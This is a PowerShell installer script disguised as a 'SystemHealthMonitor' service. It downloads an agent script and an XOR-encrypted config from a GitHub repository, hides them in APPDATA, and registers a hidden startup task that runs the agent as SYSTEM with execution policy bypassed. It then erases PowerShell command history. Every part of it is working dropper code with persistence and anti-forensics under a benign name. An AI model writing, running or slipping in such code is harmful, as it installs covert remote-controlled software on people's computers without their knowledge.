# Direct URLs - MAKE SURE THESE FILES EXIST ON GITHUB
$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/main/HealthMonitor.ps1"
$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/main/config.enc"

# Decryption key
$key = "S3cr3tK3y2024!"

# Create hidden folder (fixed)
$basePath = "$env:APPDATA\SystemHealthService"
if (-not (Test-Path $basePath)) {
    $folder = New-Item -ItemType Directory -Path $basePath -Force
    $folder.Attributes = "Hidden"
}

# Download agent
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
    (Get-Item "$basePath\HealthMonitor.ps1").Attributes = "Hidden"
} catch {
    Write-Host "ERROR downloading agent: $_" -ForegroundColor Red
    exit
}

# Download and decrypt config
try {
    $encryptedBase64 = (New-Object Net.WebClient).DownloadString($configUrl)
    $encrypted = [Convert]::FromBase64String($encryptedBase64)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $decrypted = @()
    for ($i = 0; $i -lt $encrypted.Length; $i++) {
        $decrypted += $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    $config = [System.Text.Encoding]::UTF8.GetString($decrypted)
    [System.IO.File]::WriteAllText("$basePath\config.json", $config)
    (Get-Item "$basePath\config.json").Attributes = "Hidden"
} catch {
    Write-Host "ERROR downloading config: $_" -ForegroundColor Red
    exit
}

# Create scheduled task
Register-ScheduledTask -TaskName "SystemHealthMonitor" `
    -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`"") `
    -Trigger (New-ScheduledTaskTrigger -AtStartup) `
    -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
    -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) `
    -Force

Start-ScheduledTask -TaskName "SystemHealthMonitor"
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
